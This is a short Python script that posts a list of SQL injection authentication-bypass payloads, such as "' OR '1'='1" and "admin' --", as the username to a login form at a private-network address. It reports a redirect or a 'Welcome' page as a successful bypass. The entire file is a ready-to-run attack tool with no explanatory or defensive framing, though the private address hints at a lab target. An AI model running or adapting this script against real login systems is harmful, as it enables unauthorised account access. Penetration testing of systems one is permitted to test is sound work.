import requests
import sys

target = "http://192.168.0.28:3000/login"

# Payloads to test
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' OR '1'='1' --",
    '" OR "1"="1',
    "admin' #"
]

print(f"Testing SQLi on {target}")

for payload in payloads:
    data = {
        'username': payload,
        'password': 'password123' # Arbitrary password
    }
    
    try:
        # Assuming typical login form fields 'username' and 'password'
        # Need to verify field names, but common defaults are these.
        res = requests.post(target, data=data, allow_redirects=False)
        
        print(f"Payload: {payload}")
        print(f"Status Code: {res.status_code}")
        if res.status_code == 302 or "Welcome" in res.text:
             print("[+] Potential SQLi Bypass Detected!")
             print(f"Redirect location: {res.headers.get('Location')}")
        else:
             print("[-] Failed")
        print("-" * 20)
        
    except Exception as e:
        print(f"Error: {e}")
